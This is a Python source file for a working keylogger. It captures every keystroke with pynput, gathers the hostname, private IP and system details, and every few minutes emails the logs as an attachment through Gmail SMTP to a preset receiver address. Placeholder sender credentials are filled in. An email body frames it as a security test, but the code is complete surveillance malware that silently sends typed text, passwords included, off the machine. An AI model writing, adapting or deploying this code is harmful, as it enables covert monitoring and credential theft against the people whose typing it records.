import subprocess

try:
    import platform
    import socket
    import threading
    import smtplib
    import time
    import re
    from pynput import keyboard
    from pynput.keyboard import Listener, Key
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
except ImportError as e:
    print("One or more required libraries are not installed. Attempting installation...")
    
    # List of required libraries
    required_libraries = [
        "platform",
        "socket",
        "threading",
        "smtplib",
        "time",
        "pynput",
        "email"
    ]

    # Attempt installation using pip3
    for lib in required_libraries:
        subprocess.run(["pip3", "install", lib], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Retry importing the libraries
    try:
        import platform
        import socket
        import threading
        import smtplib
        import time
        import re
        from pynput import keyboard
        from pynput.keyboard import Listener, Key
        from email.mime.multipart import MIMEMultipart
        from email.mime.text import MIMEText
        from email.mime.base import MIMEBase
        from email import encoders
    except ImportError:
        print("Failed to install or import required libraries. Please install them manually.")
        exit()

# All required libraries are successfully imported
print("All required libraries are successfully imported.")

# Email credentials and settings
sender_email = "example@gmail.com"    #disposal email address
sender_password = "password"          #disposal email address password

receiver_email = "reciver@gmail.com"  #receiver email address

# Email sending frequency settings
SEND_REPORT_EVERY_SYSTEM = 540  # Send system information every 9 minutes (9 * 60)
SEND_REPORT_EVERY_KEYLOG = 180  # Send key logs every 3 minutes (3 * 60)

# Log file name
log_file = "key_and_system_info.txt"

# Keys to ignore (not log)
ignored_keys = [Key.shift, Key.shift_r, Key.tab, Key.caps_lock, Key.ctrl,
                Key.ctrl_r, Key.media_next, Key.alt_l, Key.cmd, Key.insert,
                Key.left, Key.delete, Key.page_down, Key.page_up, Key.up,
                Key.down, Key.left, Key.right, Key.ctrl_l, Key.ctrl, Key.home,
                Key.print_screen, Key.print_screen, Key.scroll_lock, Key.scroll_lock, 
                Key.pause, Key.pause, Key.alt_gr]

# Keylogger class definition
class KeyLogger:
    def __init__(self, sender_email, sender_password, receiver_email):
        self.log = ""
        self.system_info_log = ""
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.receiver_email = receiver_email
 
    def appendlog(self, string):
        self.log += string

    def on_press(self, key):
        try:
            if key in ignored_keys:
                # Ignore these keys
                return
            elif key == keyboard.Key.backspace:
                # Remove the last character from the log string
                self.log = self.log[:-1]
            elif key == keyboard.Key.enter:
                # Start a new line in the log string
                self.log += "\n"
            else:
                # Add the pressed key to the log string
                current_key = str(key.char)
                self.appendlog(current_key)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
            self.appendlog(current_key)

    def computer_information(self):
        self.system_info_log = ""
        self.system_info_log += "System Information:\n"
  
        # Retrieve system information
        hostname = socket.gethostname()
        self.system_info_log += f"Hostname: {hostname}\n"

        # Retrieve private IP address based on the operating system
        try:
            if platform.system() == "Windows":
                IPAddr = socket.gethostbyname(hostname)
                self.system_info_log += f"Private IP Address: {IPAddr}\n"
            elif platform.system() == "Linux" or platform.system() == "Darwin":
                output = subprocess.check_output(['ifconfig']).decode()
                ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
                matches = ip_pattern.findall(output)
                if matches:
                    private_ip = matches[0]
                    self.system_info_log += f"Private IP Address: {private_ip}\n"
                else:
                    self.system_info_log += "Couldn't retrieve Private IP Address\n"
            else:
                self.system_info_log += "Unsupported operating system\n"
        except Exception as e:
            self.system_info_log += f"Error retrieving IP Address: {str(e)}\n"
       
        self.system_info_log += f"Processor: {platform.processor()}\n"
        self.system_info_log += f"System: {platform.system()} {platform.version()}\n"
        self.system_info_log += f"Machine: {platform.machine()}\n"

    def send_mail(self, message):
        mail_body = """Hello,
This email is to inform you that we are currently 
testing a keylogger for monitoring keyboard activity. 
This test is part of our security assessment to ensure 
the integrity and security of our systems.

If you have any questions or concerns regarding this test, 
please feel free to contact us.
Thank you for your understanding.

Best regards,
[your name]
"""
        msg = MIMEMultipart()
        msg['From'] = self.sender_email
        msg['To'] = self.receiver_email
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(mail_body, 'plain'))

        # Combine system information and key logs
        combined_log = self.system_info_log + "\n\nKey Logs:\n" + self.log

        # Attach the combined log file
        attachment = MIMEBase('application', 'octet-stream')
        attachment.set_payload(combined_log.encode())
        encoders.encode_base64(attachment)
        attachment.add_header('Content-Disposition', 'attachment', filename=log_file)
        msg.attach(attachment)

        # Send email with the combined log file attached
        try:
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.sender_email, self.sender_password)
                server.sendmail(self.sender_email, self.receiver_email, msg.as_string())
            print("Email sent successfully!")
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report_system_info(self):
        # Periodically report system information
        self.computer_information()
        self.send_mail(self.system_info_log)
        threading.Timer(SEND_REPORT_EVERY_KEYLOG, self.report_key_logs).start()

    def report_key_logs(self):
        # Periodically report key logs
        self.send_mail(self.log)
        threading.Timer(SEND_REPORT_EVERY_KEYLOG, self.report_key_logs).start()
        
    def start(self):
        # Start the keylogger
        keyboard_listener = Listener(on_press=self.on_press)
        with keyboard_listener:
            # Start reporting system information and key logs
            self.report_system_info()
            self.report_key_logs()
            keyboard_listener.join()

if __name__ == "__main__":
    # Initialize and start the keylogger
    keylogger = KeyLogger(sender_email, sender_password, receiver_email)
    keylogger.start()
